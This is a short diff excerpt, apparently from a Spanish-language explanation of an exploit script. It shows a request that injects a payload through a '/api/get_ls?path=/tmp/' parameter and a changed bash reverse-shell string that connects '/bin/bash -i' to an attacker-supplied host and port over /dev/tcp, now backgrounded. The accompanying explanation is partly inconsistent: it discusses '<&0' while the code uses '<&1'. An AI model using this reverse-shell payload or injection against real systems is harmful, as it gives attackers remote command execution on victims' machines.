@@ -519,7 +519,7 @@ step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 
 ### Explicación de los cambios:
 
-`"bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} <&1'"`
+`"bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} <&1 &'"`
 
 - `>& /dev/tcp/{0}/{1}`: Esto redirige la salida estándar y la salida de error estándar al socket TCP.
 - `<&0`: Esto redirige la entrada estándar (`stdin`) al socket TCP. En este caso, `<&0` especifica que la entrada estándar debe ser utilizada para el flujo de entrada.
